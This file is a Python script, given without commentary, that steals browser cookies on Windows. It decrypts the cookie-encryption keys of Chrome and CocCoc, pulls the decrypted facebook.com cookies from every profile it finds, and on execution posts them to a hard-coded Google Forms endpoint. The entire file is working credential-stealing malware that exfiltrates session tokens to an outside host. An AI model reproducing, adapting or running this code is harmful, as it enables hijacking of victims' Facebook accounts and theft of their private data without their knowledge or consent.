import os
import base64
import sqlite3
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
import json
import requests

def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def get_encryption_key():
    local_state_path = None
    try:
	    local_state_path = os.path.join(os.environ["USERPROFILE"],
	                                        "AppData", "Local", "Google", "Chrome",
	                                        "User Data", "Local State")
	    if local_state_path != None:
	        with open(local_state_path, "r", encoding="utf-8") as f:
	            local_state = f.read()
	            local_state = json.loads(local_state)
	        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	        key = key[5:]
	        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
	    return None
    except:
        return None

def get_encryption_key_cc():
	local_state_path_cc = None 
	try:
		local_state_path_cc = os.path.join(os.environ["USERPROFILE"],
	                                        "AppData", "Local", "CocCoc", "Browser",
	                                        "User Data", "Local State")
		if local_state_path_cc != None:
			with open(local_state_path_cc, "r", encoding="utf-8") as g:
				local_state = g.read()
				local_state = json.loads(local_state)
			key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])	
			key = key[5:]
			return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
		return None
	except:
		return None 

def craw_cookie():
	list_cookie = ""
	list_cookies= ""
	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
	conn.text_factory = lambda b: b.decode(errors = 'ignore')
	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn)+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie

def craw_cookie_1():
	list_cookie_1 = ""
	conn_1 = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies")
	conn_1.text_factory = lambda b: b.decode(errors = 'ignore')
	list_cookie_1+=read_cookie_from_sqlite_cc(conn_1)+"\n##########\n"
	for j in range(0,1000):
		try:
			conn_1 = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(j)+"\\Network\\Cookies")
			conn_1.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn_1)+"\n##########\n"
			list_cookie_1+=cookie
		except:
			pass
	return list_cookie_1

def read_cookie_from_sqlite(conn):
	list_cookie = ""
	if conn != None:
		with conn:
			cur = conn.cursor()
			cur.execute("SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key")
			key = get_encryption_key()
			if key != None:
				for i in cur.fetchall():
					decrypted_value = decrypt_data(i[2], key)
					list_cookie += i[1]+"="+decrypted_value+";" #
				return list_cookie


def read_cookie_from_sqlite_cc(conn_1):
	list_cookie_1 = ""
	if conn_1 != None:
		with conn_1:
			cur_1 = conn_1.cursor()
			cur_1.execute("SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key")
			key = get_encryption_key_cc()
			if key != None:
				for j in cur_1.fetchall():
					decrypted_value_1 = decrypt_data(j[2], key)
					list_cookie_1 += j[1]+"="+decrypted_value_1+";" #
				return list_cookie_1


def send_cookie(cookie):
	url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmtqX-H4Mqv3EvWN55yTKjOtu4tmJm_e-P_YaL9t-znKEYzw/formResponse'
	data = {
		'entry.1111466795': cookie + ""
	}
	requests.post(url,data=data)

send_cookie("Chrome \n" + craw_cookie() + " CocCoc " + craw_cookie_1())

